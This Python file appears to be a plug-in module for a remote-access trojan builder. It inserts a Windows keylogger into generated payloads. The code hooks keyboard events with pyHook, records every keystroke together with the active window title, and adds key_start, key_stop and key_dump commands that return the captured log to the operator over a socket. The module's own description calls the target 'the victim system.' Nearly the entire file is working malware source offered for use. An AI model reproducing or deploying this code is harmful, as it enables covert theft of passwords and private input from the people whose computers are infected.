# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyHook')
        config.import_statements.append('import pythoncom')
        config.import_statements.append('import threading')
        config.import_statements.append('from ctypes import windll')
        config.global_objs.append('keylog = ""')
        config.global_objs.append('window = ""')
        config.global_objs.append('active_logger = False')
        config.functions.append('''
def OnKeyboardEvent(event):
    global window
    global keylog
    sample_space = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
    try:
        letter = event.Key
        if event.WindowName != window:
            keylog += '\\n\\n<User started typing in new window : ' + event.WindowName + '>\\n\\n'
            window = event.WindowName
        if letter not in sample_space:
            keylog += '[' + letter + ']'
        else:
            keylog += letter
    except:
        keylog += '[Error Logging Key!]'
    return True

def key(option):
    global active_logger
    global keylog
    if option == 'key_start':
        if active_logger:
            main_send('[-]Keylogger already started', s)
        else:
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = OnKeyboardEvent
            hooks_manager.HookKeyboard()
            active_logger = not active_logger
            main_send('[+]Activated keylogger', s)
            while True:
                if not active_logger:
                    hooks_manager.UnhookKeyboard()
                    windll.user32.PostQuitMessage(0)
                    return
                else:
                    pythoncom.PumpWaitingMessages()
    elif option == 'key_stop':
        if not active_logger:
            main_send('[-]Keylogger not started', s)
        else:
            active_logger = not active_logger
            main_send('[+]Stopped keylogger', s)
    elif option == 'key_dump':
        main_send('[+]Keylog dump : \\n' + keylog + '\\n', s)
        keylog = ""''')
        config.logics.append('''
            elif command in ('key_start','key_stop','key_dump'):
                t = threading.Thread(target=key, args=(data,))
                t.start()''')
        config.help_menu['key_start'] = 'Start the keylogger'
        config.help_menu['key_stop'] = 'Stop the keylogger'
        config.help_menu['key_dump'] = 'Dump the captured in-memory keystrokes'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Keylogger and window logger component",
                "OS": "Windows",
                "Required Modules": "PyHook (External), pythoncom (External), threading, ctypes",
                "Commands": "key_start, key_stop, key_dump",
                "Description": "Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command"}
        elif interface == "CUI":
            print('\nName             : Keylogger and window logger component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : PyHook (External), pythoncom (External), threading, ctypes' \
                  '\nCommands         : key_start, key_stop, key_dump' \
                  '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n')

